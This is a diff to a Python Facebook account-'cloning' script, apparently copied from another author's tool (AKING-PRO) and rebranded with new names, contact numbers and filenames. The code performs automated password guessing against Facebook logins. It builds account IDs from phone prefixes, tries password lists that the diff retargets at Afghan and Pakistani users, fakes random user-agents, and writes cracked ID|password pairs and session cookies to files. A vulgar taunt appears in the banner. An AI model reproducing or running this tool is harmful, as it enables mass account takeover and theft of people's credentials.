@@ -4,7 +4,7 @@
 #AWAIS & LKING FIGHT 😎 
 from os import path
 import os,base64,zlib,pip,urllib
-os.system('xdg-open https://facebook.com/groups/351076900316263/')
+os.system('xdg-open https://www.facebook.com/profile.php?id=100004820957579')
 print('\n\033[1;37m install modules...\n It will take some seconds...')
 
 try:
@@ -14,7 +14,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python AKING.py')
+        os.system('python ilyas.py')
 except:pass
         
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
@@ -47,22 +47,22 @@ for agent in range(10000):
         l='Mobile Safari/533.1'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
-logo=("""\033[1;37m
-  .d8b.  db   dD d888888b d8b   db  d888b 
- d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
- 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
- 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
- 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
- YP   YP YP   YD Y888888P VP   V8P  Y888P   
+logo=("""\033[1;39m .########...######..##.....##
+      \033[1;32m .##.....##.##....##.##.....##
+      \033[1;39m .##.....##.##.......##.....##
+      \033[1;32m .########...######..#########
+      \033[1;39m .##...##.........##.##.....##
+      \033[1;32m .##....##..##....##.##.....##
+      \033[1;39m .##.....##..######..##.....##  
 ----------------------------------------------
- Author    : MISTAH ROHZZ
- Github    : MISTAH ROHZZ
- Facebook  : MISTAH ROHZZ
- Tool Name : AKING-PRO
+ Author    : Raziqullah Saadat
+ Github    : ilyas-khostiy
+ Facebook  : Raziqullah Saadat
+ Tool Name : RSH
  Type type : FREE TRAIL
  Version   : 1.0
 ----------------------------------------------
- AKING Pro version 1.9.8
+ ilyas-Khostiy version 1.9.8
  For Haters: Tumhare Okat Nhi Mere BAAJI chodne Ke 🤞
 \033[1;37m----------------------------------------------""")
 def linex():
@@ -202,7 +202,7 @@ def public():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python ilyas.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -283,7 +283,7 @@ def menu():
                                 public()
                         elif xd in ['4','04']:
                                 clear()
-                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
+                                print(' [1] Afghanistan cloning\n [2] Pakistan cloning\n [3] Gmail cloning\n [0] Back menu')
                                 linex()
                                 x=input(' Choose: ')
                                 if x in ['1','01']:
@@ -321,7 +321,7 @@ def menu():
                         linex()
                         print(" Your Subscription Date Expire")
                         linex()
-                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
+                        url_wa = "https://api.whatsapp.com/send?phone=+93702856593&text="
                         name = input(" Enter your Name : ")
                         linex()
                         tks = ("Hi Aking Sir, I Need To Buy Your Paid AKING PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
@@ -354,7 +354,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
+                                passlist = [psx,ids,'۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','khost123','khan1234','kabul123','afghanistan','100200','200300','10002000','786786']
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -366,7 +366,7 @@ def pak():
 def bd():
                 user=[]
                 clear()
-                print('\033[1;31m Code example: 016,017,018,019')
+                print('\033[1;31m Code example: 0306,0315,0335,0345')
                 code = input('\033[1;37m put code: ')
                 try:
                         limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
@@ -384,7 +384,7 @@ def bd():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
+                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -447,10 +447,10 @@ def gmail():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python ilyas.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [Saadat-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -471,13 +471,13 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aking:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [AKING-OK] %s | %s'%(ids,pas))
+                                print('\r\r\033[1;32m [Saadat-OK] %s | %s'%(ids,pas))
                                 open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -492,7 +492,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Saadat-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -542,13 +542,13 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Saadat-OK] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -562,7 +562,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Saadat-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -613,13 +613,13 @@ def api1(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [Saadat-OK] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[38;5;208m [Saadat-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -636,7 +636,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Saadat-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -686,12 +686,12 @@ def rndm(ids,passlist):
                                                 okk=open('/sdcard/AKING-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        print('\r\r\033[1;32m [Saadat-OK] '+uid+' | '+pas+'\033[1;97m')
                                                         open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033[1;32m [Saadat-OK] '+uid+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
